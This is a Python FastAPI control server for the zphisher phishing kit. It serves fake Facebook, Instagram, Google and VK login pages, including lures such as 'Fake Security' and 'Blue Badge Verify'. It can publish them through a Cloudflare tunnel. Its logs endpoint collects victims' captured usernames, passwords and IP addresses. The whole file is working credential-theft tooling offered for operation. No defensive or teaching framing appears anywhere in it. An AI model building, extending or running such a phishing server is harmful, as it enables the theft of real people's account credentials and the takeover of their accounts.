import os
import shutil
import subprocess
import signal
import asyncio
from typing import List, Optional
from fastapi import FastAPI, BackgroundTasks
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import glob

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount static files
app.mount("/images", StaticFiles(directory="images"), name="images")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SITES_DIR = os.path.join(BASE_DIR, ".sites")
SERVER_DIR = os.path.join(BASE_DIR, ".server")
AUTH_DIR = os.path.join(BASE_DIR, "auth")

# Ensure directories exist
os.makedirs(SERVER_DIR, exist_ok=True)
os.makedirs(AUTH_DIR, exist_ok=True)





# Global config & state
class AppState:
    process: Optional[subprocess.Popen] = None
    cloudflared: Optional[subprocess.Popen] = None
    current_site: Optional[str] = None
    port: int = 8080
    
state = AppState()

class AttackRequest(BaseModel):
    site: str
    option: str = "default"
    use_cloudflared: bool = False
    port: int = 8080

# Validates path against directory traversal
def is_safe_path(path):
    return os.path.abspath(path).startswith(os.path.abspath(SITES_DIR))

# Hardcoded mapping to match zphisher.sh logic
# This ensures "Template 4" (Messenger) appears under Facebook, etc.
SITE_MAPPING = {
    "facebook": {
        "Traditional Login": "facebook",
        "Advanced Voting Poll": "fb_advanced",
        "Fake Security": "fb_security",
        "Messenger Login": "fb_messenger"
    },
    "instagram": {
        "Traditional Login": "instagram",
        "Auto Followers": "ig_followers",
        "1000 Followers": "insta_followers",
        "Blue Badge Verify": "ig_verify"
    },
    "google": {
        "Gmail Old": "google",
        "Gmail New": "google_new",
        "Advanced Voting Poll": "google_poll"
    },
    "vk": {
        "Traditional Login": "vk",
        "Advanced Voting Poll": "vk_poll"
    }
    # Add others as simple 1-to-1 if they don't have variants
}

# Auto-discover other simple sites
def discover_sites():
    mapping = SITE_MAPPING.copy()
    if os.path.exists(SITES_DIR):
        for item in sorted(os.listdir(SITES_DIR)):
            path = os.path.join(SITES_DIR, item)
            if os.path.isdir(path):
                # Check if already mapped
                is_mapped = False
                for parent, children in mapping.items():
                    if isinstance(children, dict) and item in children.values():
                        is_mapped = True
                        break
                    elif children == item:
                        is_mapped = True
                        break
                
                if not is_mapped:
                    # Add as simple entry
                    mapping[item] = item
    return mapping

@app.get("/api/sites")
async def list_sites():
    return {"sites": discover_sites()}

@app.get("/api/status")
async def get_status():
    """Detailed health check of the attack."""
    return {
        "active": state.process is not None,
        "site": state.current_site,
        "port": state.port,
        "cloudflared": state.cloudflared is not None,
        "php_pid": state.process.pid if state.process else None,
        "cld_pid": state.cloudflared.pid if state.cloudflared else None
    }

def kill_process_by_port(port: int):
    """Force kill any process listening on the specified port."""
    try:
        # Fuser is reliable for finding processes on ports
        subprocess.run(["fuser", "-k", f"{port}/tcp"], stderr=subprocess.DEVNULL)
    except:
        pass


def download_cloudflared():
    if os.path.exists(os.path.join(SERVER_DIR, "cloudflared")):
        return True
        
    import platform
    arch = platform.machine()
    system = platform.system().lower()
    
    url = ""
    if "linux" in system:
        if "aarch64" in arch or "arm64" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif "arm" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        elif "x86_64" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
    
    if url:
        try:
             subprocess.run(["curl", "-L", "--output", os.path.join(SERVER_DIR, "cloudflared"), url], check=True)
             subprocess.run(["chmod", "+x", os.path.join(SERVER_DIR, "cloudflared")], check=True)
             return True
        except:
             return False
    return False

@app.post("/api/start")
async def start_attack(request: AttackRequest):
    # Stop existing
    await stop_attack()
    
    state.current_site = request.site
    state.port = request.port
    
    site_path = os.path.join(SITES_DIR, request.site)
    if not os.path.exists(site_path):
        return JSONResponse(status_code=404, content={"message": "Site not found"})

    # Prepare directories
    if os.path.exists(os.path.join(SERVER_DIR, "www")):
        shutil.rmtree(os.path.join(SERVER_DIR, "www"))
    os.makedirs(os.path.join(SERVER_DIR, "www"))

    try:
        # Copy files
        shutil.copytree(site_path, os.path.join(SERVER_DIR, "www"), dirs_exist_ok=True)
        shutil.copy(os.path.join(SITES_DIR, "ip.php"), os.path.join(SERVER_DIR, "www"))
        
        # Ensure port is free
        kill_process_by_port(request.port)
        
        # Start PHP
        cmd = ["php", "-S", f"0.0.0.0:{request.port}", "-t", os.path.join(SERVER_DIR, "www")]
        state.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Start Cloudflared
        if request.use_cloudflared:
            if download_cloudflared():
                cld_log = os.path.join(SERVER_DIR, ".cld.log")
                if os.path.exists(cld_log): os.remove(cld_log)
                
                cld_cmd = [
                    os.path.join(SERVER_DIR, "cloudflared"), 
                    "tunnel", 
                    "-url", f"127.0.0.1:{request.port}", 
                    "--logfile", cld_log
                ]
                state.cloudflared = subprocess.Popen(cld_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                 # If download fails, we still let PHP run but warn user? 
                 # For API simplicity, we might just fail or return partial success.
                 # Let's fail hard so user knows.
                 await stop_attack()
                 return JSONResponse(status_code=500, content={"message": "Failed to setup Cloudflared"})
        
        return {
            "status": "started", 
            "pid": state.process.pid, 
            "url": f"http://127.0.0.1:{request.port}"
        }
        
    except Exception as e:
        await stop_attack()
        return JSONResponse(status_code=500, content={"message": str(e)})

@app.post("/api/stop")
async def stop_attack():
    if state.process:
        state.process.terminate()
        try:
            state.process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            state.process.kill()
        state.process = None
    
    if state.cloudflared:
        state.cloudflared.terminate()
        try:
            state.cloudflared.wait(timeout=2)
        except subprocess.TimeoutExpired:
            state.cloudflared.kill()
        state.cloudflared = None
    
    # Safety cleanup
    if state.port:
        kill_process_by_port(state.port)
    subprocess.run(["pkill", "-f", "cloudflared tunnel"])
    
    return {"status": "stopped"}

@app.get("/api/logs")
async def get_logs():
    auth_data = {}
    
    # Read usernames
    if os.path.exists(os.path.join(SERVER_DIR, "www", "usernames.txt")):
         with open(os.path.join(SERVER_DIR, "www", "usernames.txt"), 'r') as f:
            auth_data["credentials"] = f.read()
            
    # Read IP
    if os.path.exists(os.path.join(SERVER_DIR, "www", "ip.txt")):
         with open(os.path.join(SERVER_DIR, "www", "ip.txt"), 'r') as f:
            auth_data["ips"] = f.read()
            
    # Read Cloudflared URL
    cld_log = os.path.join(SERVER_DIR, ".cld.log")
    if os.path.exists(cld_log):
        with open(cld_log, 'r') as f:
            content = f.read()
            # Extract URL using simple parsing logic or regex
            import re
            match = re.search(r'https://[-0-9a-z]*\.trycloudflare\.com', content)
            if match:
                auth_data["cloudflared_url"] = match.group(0)

    return auth_data

@app.post("/api/logs/delete")
async def delete_logs():
    try:
        if os.path.exists(os.path.join(SERVER_DIR, "www", "usernames.txt")):
            os.remove(os.path.join(SERVER_DIR, "www", "usernames.txt"))
        if os.path.exists(os.path.join(SERVER_DIR, "www", "ip.txt")):
            os.remove(os.path.join(SERVER_DIR, "www", "ip.txt"))
        return {"status": "deleted"}
    except Exception as e:
        return JSONResponse(status_code=500, content={"message": str(e)})

# Serve Static Files (Frontend)
app.mount("/", StaticFiles(directory="templates", html=True), name="static")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
